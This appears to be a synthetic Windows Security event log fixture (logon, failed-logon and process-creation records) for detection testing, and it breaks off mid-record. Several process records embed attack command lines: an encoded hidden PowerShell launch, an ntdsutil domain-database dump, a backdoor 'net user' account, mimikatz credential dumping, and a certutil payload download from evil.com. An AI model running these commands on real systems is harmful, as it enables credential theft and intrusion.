{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4624</EventID><Version>2</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T00:15:00.000Z\"/><EventRecordID>1001</EventRecordID><Channel>Security</Channel><Computer>WORKSTATION-01.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-18</Data><Data Name=\"SubjectUserName\">WORKSTATION-01$</Data><Data Name=\"SubjectDomainName\">CORP</Data><Data Name=\"TargetUserSid\">S-1-5-21-3623811015-3361044348-30300820-1001</Data><Data Name=\"TargetUserName\">jsmith</Data><Data Name=\"TargetDomainName\">CORP</Data><Data Name=\"LogonType\">10</Data><Data Name=\"LogonProcessName\">User32</Data><Data Name=\"AuthenticationPackageName\">Negotiate</Data><Data Name=\"WorkstationName\">WORKSTATION-01</Data><Data Name=\"LogonGuid\">{A1B2C3D4-E5F6-4A7B-8C9D-0E1F2A3B4C5D}</Data><Data Name=\"IpAddress\">192.168.1.100</Data><Data Name=\"IpPort\">49152</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4624</EventID><Version>2</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T01:30:00.000Z\"/><EventRecordID>1002</EventRecordID><Channel>Security</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-18</Data><Data Name=\"SubjectUserName\">SERVER-DC-01$</Data><Data Name=\"SubjectDomainName\">CORP</Data><Data Name=\"TargetUserSid\">S-1-5-21-3623811015-3361044348-30300820-500</Data><Data Name=\"TargetUserName\">admin</Data><Data Name=\"TargetDomainName\">CORP</Data><Data Name=\"LogonType\">3</Data><Data Name=\"LogonProcessName\">Kerberos</Data><Data Name=\"AuthenticationPackageName\">Kerberos</Data><Data Name=\"WorkstationName\">-</Data><Data Name=\"LogonGuid\">{B2C3D4E5-F6A7-4B8C-9D0E-1F2A3B4C5D6E}</Data><Data Name=\"IpAddress\">192.168.1.102</Data><Data Name=\"IpPort\">49400</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4624</EventID><Version>2</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T02:45:00.000Z\"/><EventRecordID>1003</EventRecordID><Channel>Security</Channel><Computer>WORKSTATION-02.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-18</Data><Data Name=\"SubjectUserName\">WORKSTATION-02$</Data><Data Name=\"SubjectDomainName\">CORP</Data><Data Name=\"TargetUserSid\">S-1-5-21-3623811015-3361044348-30300820-1001</Data><Data Name=\"TargetUserName\">jsmith</Data><Data Name=\"TargetDomainName\">CORP</Data><Data Name=\"LogonType\">2</Data><Data Name=\"LogonProcessName\">User32</Data><Data Name=\"AuthenticationPackageName\">Negotiate</Data><Data Name=\"WorkstationName\">WORKSTATION-02</Data><Data Name=\"LogonGuid\">{C3D4E5F6-A7B8-4C9D-0E1F-2A3B4C5D6E7F}</Data><Data Name=\"IpAddress\">127.0.0.1</Data><Data Name=\"IpPort\">0</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4624</EventID><Version>2</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T04:00:00.000Z\"/><EventRecordID>1004</EventRecordID><Channel>Security</Channel><Computer>SERVER-WEB-01.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-18</Data><Data Name=\"SubjectUserName\">SERVER-WEB-01$</Data><Data Name=\"SubjectDomainName\">CORP</Data><Data Name=\"TargetUserSid\">S-1-5-82-1</Data><Data Name=\"TargetUserName\">IIS_IUSRS</Data><Data Name=\"TargetDomainName\">IIS APPPOOL</Data><Data Name=\"LogonType\">5</Data><Data Name=\"LogonProcessName\">Advapi</Data><Data Name=\"AuthenticationPackageName\">Negotiate</Data><Data Name=\"WorkstationName\">-</Data><Data Name=\"LogonGuid\">{D4E5F6A7-B8C9-4D0E-1F2A-3B4C5D6E7F8A}</Data><Data Name=\"IpAddress\">-</Data><Data Name=\"IpPort\">-</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4624</EventID><Version>2</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T05:15:00.000Z\"/><EventRecordID>1005</EventRecordID><Channel>Security</Channel><Computer>WORKSTATION-04.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-18</Data><Data Name=\"SubjectUserName\">WORKSTATION-04$</Data><Data Name=\"SubjectDomainName\">CORP</Data><Data Name=\"TargetUserSid\">S-1-5-21-3623811015-3361044348-30300820-1002</Data><Data Name=\"TargetUserName\">agarcia</Data><Data Name=\"TargetDomainName\">CORP</Data><Data Name=\"LogonType\">2</Data><Data Name=\"LogonProcessName\">User32</Data><Data Name=\"AuthenticationPackageName\">Negotiate</Data><Data Name=\"WorkstationName\">WORKSTATION-04</Data><Data Name=\"LogonGuid\">{E5F6A7B8-C9D0-4E1F-2A3B-4C5D6E7F8A9B}</Data><Data Name=\"IpAddress\">127.0.0.1</Data><Data Name=\"IpPort\">0</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4624</EventID><Version>2</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T06:30:00.000Z\"/><EventRecordID>1006</EventRecordID><Channel>Security</Channel><Computer>SERVER-DB-01.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-18</Data><Data Name=\"SubjectUserName\">SERVER-DB-01$</Data><Data Name=\"SubjectDomainName\">CORP</Data><Data Name=\"TargetUserSid\">S-1-5-21-3623811015-3361044348-30300820-1105</Data><Data Name=\"TargetUserName\">svc_backup</Data><Data Name=\"TargetDomainName\">CORP</Data><Data Name=\"LogonType\">3</Data><Data Name=\"LogonProcessName\">Kerberos</Data><Data Name=\"AuthenticationPackageName\">Kerberos</Data><Data Name=\"WorkstationName\">-</Data><Data Name=\"LogonGuid\">{F6A7B8C9-D0E1-4F2A-3B4C-5D6E7F8A9B0C}</Data><Data Name=\"IpAddress\">192.168.1.105</Data><Data Name=\"IpPort\">49804</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4624</EventID><Version>2</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T07:45:00.000Z\"/><EventRecordID>1007</EventRecordID><Channel>Security</Channel><Computer>WORKSTATION-03.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-18</Data><Data Name=\"SubjectUserName\">WORKSTATION-03$</Data><Data Name=\"SubjectDomainName\">CORP</Data><Data Name=\"TargetUserSid\">S-1-5-21-3623811015-3361044348-30300820-1003</Data><Data Name=\"TargetUserName\">bwilson</Data><Data Name=\"TargetDomainName\">CORP</Data><Data Name=\"LogonType\">2</Data><Data Name=\"LogonProcessName\">User32</Data><Data Name=\"AuthenticationPackageName\">Negotiate</Data><Data Name=\"WorkstationName\">WORKSTATION-03</Data><Data Name=\"LogonGuid\">{A7B8C9D0-E1F2-4A3B-4C5D-6E7F8A9B0C1D}</Data><Data Name=\"IpAddress\">127.0.0.1</Data><Data Name=\"IpPort\">0</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4624</EventID><Version>2</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T09:00:00.000Z\"/><EventRecordID>1008</EventRecordID><Channel>Security</Channel><Computer>WORKSTATION-05.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-18</Data><Data Name=\"SubjectUserName\">WORKSTATION-05$</Data><Data Name=\"SubjectDomainName\">CORP</Data><Data Name=\"TargetUserSid\">S-1-5-21-3623811015-3361044348-30300820-1002</Data><Data Name=\"TargetUserName\">agarcia</Data><Data Name=\"TargetDomainName\">CORP</Data><Data Name=\"LogonType\">11</Data><Data Name=\"LogonProcessName\">User32</Data><Data Name=\"AuthenticationPackageName\">Negotiate</Data><Data Name=\"WorkstationName\">WORKSTATION-05</Data><Data Name=\"LogonGuid\">{B8C9D0E1-F2A3-4B4C-5D6E-7F8A9B0C1D2E}</Data><Data Name=\"IpAddress\">127.0.0.1</Data><Data Name=\"IpPort\">0</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4624</EventID><Version>2</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T10:15:00.000Z\"/><EventRecordID>1009</EventRecordID><Channel>Security</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-18</Data><Data Name=\"SubjectUserName\">SERVER-DC-01$</Data><Data Name=\"SubjectDomainName\">CORP</Data><Data Name=\"TargetUserSid\">S-1-5-21-3623811015-3361044348-30300820-1001</Data><Data Name=\"TargetUserName\">jsmith</Data><Data Name=\"TargetDomainName\">CORP</Data><Data Name=\"LogonType\">3</Data><Data Name=\"LogonProcessName\">NtLmSsp</Data><Data Name=\"AuthenticationPackageName\">NTLM</Data><Data Name=\"WorkstationName\">WORKSTATION-02</Data><Data Name=\"LogonGuid\">{00000000-0000-0000-0000-000000000000}</Data><Data Name=\"IpAddress\">192.168.1.101</Data><Data Name=\"IpPort\">49802</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>12546</Task><Opcode>0</Opcode><Keywords>0x8010000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T01:00:00.000Z\"/><EventRecordID>2001</EventRecordID><Channel>Security</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-0-0</Data><Data Name=\"SubjectUserName\">-</Data><Data Name=\"SubjectDomainName\">-</Data><Data Name=\"TargetUserSid\">S-1-0-0</Data><Data Name=\"TargetUserName\">admin</Data><Data Name=\"TargetDomainName\">CORP</Data><Data Name=\"Status\">0xc000006d</Data><Data Name=\"FailureReason\">%%2313</Data><Data Name=\"SubStatus\">0xc000006a</Data><Data Name=\"LogonType\">3</Data><Data Name=\"LogonProcessName\">NtLmSsp</Data><Data Name=\"AuthenticationPackageName\">NTLM</Data><Data Name=\"WorkstationName\">WORKSTATION-02</Data><Data Name=\"IpAddress\">192.168.1.101</Data><Data Name=\"IpPort\">50100</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>12546</Task><Opcode>0</Opcode><Keywords>0x8010000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T01:00:05.000Z\"/><EventRecordID>2002</EventRecordID><Channel>Security</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-0-0</Data><Data Name=\"SubjectUserName\">-</Data><Data Name=\"SubjectDomainName\">-</Data><Data Name=\"TargetUserSid\">S-1-0-0</Data><Data Name=\"TargetUserName\">admin</Data><Data Name=\"TargetDomainName\">CORP</Data><Data Name=\"Status\">0xc000006d</Data><Data Name=\"FailureReason\">%%2313</Data><Data Name=\"SubStatus\">0xc000006a</Data><Data Name=\"LogonType\">3</Data><Data Name=\"LogonProcessName\">NtLmSsp</Data><Data Name=\"AuthenticationPackageName\">NTLM</Data><Data Name=\"WorkstationName\">WORKSTATION-02</Data><Data Name=\"IpAddress\">192.168.1.101</Data><Data Name=\"IpPort\">50101</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>12546</Task><Opcode>0</Opcode><Keywords>0x8010000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T01:00:10.000Z\"/><EventRecordID>2003</EventRecordID><Channel>Security</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-0-0</Data><Data Name=\"SubjectUserName\">-</Data><Data Name=\"SubjectDomainName\">-</Data><Data Name=\"TargetUserSid\">S-1-0-0</Data><Data Name=\"TargetUserName\">admin</Data><Data Name=\"TargetDomainName\">CORP</Data><Data Name=\"Status\">0xc000006d</Data><Data Name=\"FailureReason\">%%2313</Data><Data Name=\"SubStatus\">0xc000006a</Data><Data Name=\"LogonType\">3</Data><Data Name=\"LogonProcessName\">NtLmSsp</Data><Data Name=\"AuthenticationPackageName\">NTLM</Data><Data Name=\"WorkstationName\">WORKSTATION-02</Data><Data Name=\"IpAddress\">192.168.1.101</Data><Data Name=\"IpPort\">50102</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>12546</Task><Opcode>0</Opcode><Keywords>0x8010000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T03:00:00.000Z\"/><EventRecordID>2004</EventRecordID><Channel>Security</Channel><Computer>WORKSTATION-01.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-0-0</Data><Data Name=\"SubjectUserName\">-</Data><Data Name=\"SubjectDomainName\">-</Data><Data Name=\"TargetUserSid\">S-1-0-0</Data><Data Name=\"TargetUserName\">administrator</Data><Data Name=\"TargetDomainName\">WORKSTATION-01</Data><Data Name=\"Status\">0xc000006d</Data><Data Name=\"FailureReason\">%%2313</Data><Data Name=\"SubStatus\">0xc0000064</Data><Data Name=\"LogonType\">10</Data><Data Name=\"LogonProcessName\">User32</Data><Data Name=\"AuthenticationPackageName\">Negotiate</Data><Data Name=\"WorkstationName\">WORKSTATION-01</Data><Data Name=\"IpAddress\">203.0.113.42</Data><Data Name=\"IpPort\">44600</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>12546</Task><Opcode>0</Opcode><Keywords>0x8010000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T05:00:00.000Z\"/><EventRecordID>2005</EventRecordID><Channel>Security</Channel><Computer>SERVER-WEB-01.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-0-0</Data><Data Name=\"SubjectUserName\">-</Data><Data Name=\"SubjectDomainName\">-</Data><Data Name=\"TargetUserSid\">S-1-0-0</Data><Data Name=\"TargetUserName\">sa</Data><Data Name=\"TargetDomainName\">SERVER-WEB-01</Data><Data Name=\"Status\">0xc000006d</Data><Data Name=\"FailureReason\">%%2313</Data><Data Name=\"SubStatus\">0xc0000064</Data><Data Name=\"LogonType\">3</Data><Data Name=\"LogonProcessName\">NtLmSsp</Data><Data Name=\"AuthenticationPackageName\">NTLM</Data><Data Name=\"WorkstationName\">-</Data><Data Name=\"IpAddress\">203.0.113.88</Data><Data Name=\"IpPort\">44300</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>12546</Task><Opcode>0</Opcode><Keywords>0x8010000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T07:00:00.000Z\"/><EventRecordID>2006</EventRecordID><Channel>Security</Channel><Computer>WORKSTATION-03.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-0-0</Data><Data Name=\"SubjectUserName\">-</Data><Data Name=\"SubjectDomainName\">-</Data><Data Name=\"TargetUserSid\">S-1-0-0</Data><Data Name=\"TargetUserName\">bwilson</Data><Data Name=\"TargetDomainName\">CORP</Data><Data Name=\"Status\">0xc000006d</Data><Data Name=\"FailureReason\">%%2313</Data><Data Name=\"SubStatus\">0xc000006a</Data><Data Name=\"LogonType\">2</Data><Data Name=\"LogonProcessName\">User32</Data><Data Name=\"AuthenticationPackageName\">Negotiate</Data><Data Name=\"WorkstationName\">WORKSTATION-03</Data><Data Name=\"IpAddress\">127.0.0.1</Data><Data Name=\"IpPort\">0</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>12546</Task><Opcode>0</Opcode><Keywords>0x8010000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T09:00:00.000Z\"/><EventRecordID>2007</EventRecordID><Channel>Security</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-0-0</Data><Data Name=\"SubjectUserName\">-</Data><Data Name=\"SubjectDomainName\">-</Data><Data Name=\"TargetUserSid\">S-1-0-0</Data><Data Name=\"TargetUserName\">krbtgt</Data><Data Name=\"TargetDomainName\">CORP</Data><Data Name=\"Status\">0xc000006d</Data><Data Name=\"FailureReason\">%%2313</Data><Data Name=\"SubStatus\">0xc0000064</Data><Data Name=\"LogonType\">3</Data><Data Name=\"LogonProcessName\">Kerberos</Data><Data Name=\"AuthenticationPackageName\">Kerberos</Data><Data Name=\"WorkstationName\">-</Data><Data Name=\"IpAddress\">192.168.1.101</Data><Data Name=\"IpPort\">49602</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>12546</Task><Opcode>0</Opcode><Keywords>0x8010000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T11:00:00.000Z\"/><EventRecordID>2008</EventRecordID><Channel>Security</Channel><Computer>WORKSTATION-04.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-0-0</Data><Data Name=\"SubjectUserName\">-</Data><Data Name=\"SubjectDomainName\">-</Data><Data Name=\"TargetUserSid\">S-1-0-0</Data><Data Name=\"TargetUserName\">localadmin</Data><Data Name=\"TargetDomainName\">WORKSTATION-04</Data><Data Name=\"Status\">0xc000006d</Data><Data Name=\"FailureReason\">%%2313</Data><Data Name=\"SubStatus\">0xc0000064</Data><Data Name=\"LogonType\">10</Data><Data Name=\"LogonProcessName\">User32</Data><Data Name=\"AuthenticationPackageName\">Negotiate</Data><Data Name=\"WorkstationName\">WORKSTATION-04</Data><Data Name=\"IpAddress\">192.168.1.101</Data><Data Name=\"IpPort\">51500</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T00:30:00.000Z\"/><EventRecordID>3001</EventRecordID><Channel>Security</Channel><Computer>WORKSTATION-01.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-21-3623811015-3361044348-30300820-1001</Data><Data Name=\"SubjectUserName\">jsmith</Data><Data Name=\"SubjectDomainName\">CORP</Data><Data Name=\"NewProcessId\">0x1234</Data><Data Name=\"NewProcessName\">C:\\Windows\\System32\\cmd.exe</Data><Data Name=\"TokenElevationType\">%%1936</Data><Data Name=\"ProcessId\">0x0ABC</Data><Data Name=\"CommandLine\">cmd.exe /c dir C:\\Users</Data><Data Name=\"ParentProcessName\">C:\\Windows\\explorer.exe</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T02:00:00.000Z\"/><EventRecordID>3002</EventRecordID><Channel>Security</Channel><Computer>WORKSTATION-02.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-21-3623811015-3361044348-30300820-1001</Data><Data Name=\"SubjectUserName\">jsmith</Data><Data Name=\"SubjectDomainName\">CORP</Data><Data Name=\"NewProcessId\">0x1A20</Data><Data Name=\"NewProcessName\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name=\"TokenElevationType\">%%1937</Data><Data Name=\"ProcessId\">0x0FAC</Data><Data Name=\"CommandLine\">powershell.exe -nop -w hidden -enc aQBlAHgA</Data><Data Name=\"ParentProcessName\">C:\\Windows\\System32\\cmd.exe</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T04:00:00.000Z\"/><EventRecordID>3003</EventRecordID><Channel>Security</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-21-3623811015-3361044348-30300820-500</Data><Data Name=\"SubjectUserName\">admin</Data><Data Name=\"SubjectDomainName\">CORP</Data><Data Name=\"NewProcessId\">0x2290</Data><Data Name=\"NewProcessName\">C:\\Windows\\System32\\ntdsutil.exe</Data><Data Name=\"TokenElevationType\">%%1937</Data><Data Name=\"ProcessId\">0x0314</Data><Data Name=\"CommandLine\">ntdsutil.exe &quot;activate instance ntds&quot; ifm &quot;create full C:\\temp\\ntds_dump&quot;</Data><Data Name=\"ParentProcessName\">C:\\Windows\\System32\\cmd.exe</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T06:00:00.000Z\"/><EventRecordID>3004</EventRecordID><Channel>Security</Channel><Computer>WORKSTATION-03.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-21-3623811015-3361044348-30300820-1003</Data><Data Name=\"SubjectUserName\">bwilson</Data><Data Name=\"SubjectDomainName\">CORP</Data><Data Name=\"NewProcessId\">0x26AC</Data><Data Name=\"NewProcessName\">C:\\Windows\\System32\\cmd.exe</Data><Data Name=\"TokenElevationType\">%%1937</Data><Data Name=\"ProcessId\">0x26A4</Data><Data Name=\"CommandLine\">cmd.exe /c net user admin Password123 /add</Data><Data Name=\"ParentProcessName\">C:\\Users\\bwilson\\Downloads\\installer.exe</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T08:00:00.000Z\"/><EventRecordID>3005</EventRecordID><Channel>Security</Channel><Computer>WORKSTATION-04.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-21-3623811015-3361044348-30300820-1002</Data><Data Name=\"SubjectUserName\">agarcia</Data><Data Name=\"SubjectDomainName\">CORP</Data><Data Name=\"NewProcessId\">0x1E14</Data><Data Name=\"NewProcessName\">C:\\Users\\agarcia\\Downloads\\mimikatz.exe</Data><Data Name=\"TokenElevationType\">%%1937</Data><Data Name=\"ProcessId\">0x19CC</Data><Data Name=\"CommandLine\">mimikatz.exe privilege::debug sekurlsa::logonpasswords</Data><Data Name=\"ParentProcessName\">C:\\Windows\\System32\\cmd.exe</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T10:00:00.000Z\"/><EventRecordID>3006</EventRecordID><Channel>Security</Channel><Computer>WORKSTATION-02.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-21-3623811015-3361044348-30300820-1001</Data><Data Name=\"SubjectUserName\">jsmith</Data><Data Name=\"SubjectDomainName\">CORP</Data><Data Name=\"NewProcessId\">0x3A98</Data><Data Name=\"NewProcessName\">C:\\Windows\\System32\\certutil.exe</Data><Data Name=\"TokenElevationType\">%%1936</Data><Data Name=\"ProcessId\">0x1A20</Data><Data Name=\"CommandLine\">certutil.exe -urlcache -split -f http://evil.com/beacon.exe C:\\temp\\beacon.exe</Data><Data Name=\"ParentProcessName\">C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.exe</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T12:00:00.000Z\"/><EventRecordID>3007</EventRecordID><Channel>Security</Channel><Computer>SERVER-WEB-01.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-82-1</Data><Data Name=\"SubjectUserName\">IIS_IUSRS</Data><Data Name=\"SubjectDomainName\">IIS APPPOOL</Data><Data Name=\"NewProcessId\">0x2EE0</Data><Data Name=\"NewProcessName\">C:\\Windows\\System32\\cmd.exe</Data><Data Name=\"TokenElevationType\">%%1936</Data><Data Name=\"ProcessId\">0x0CE4</Data><Data Name=\"CommandLine\">cmd.exe /c whoami /priv &gt; 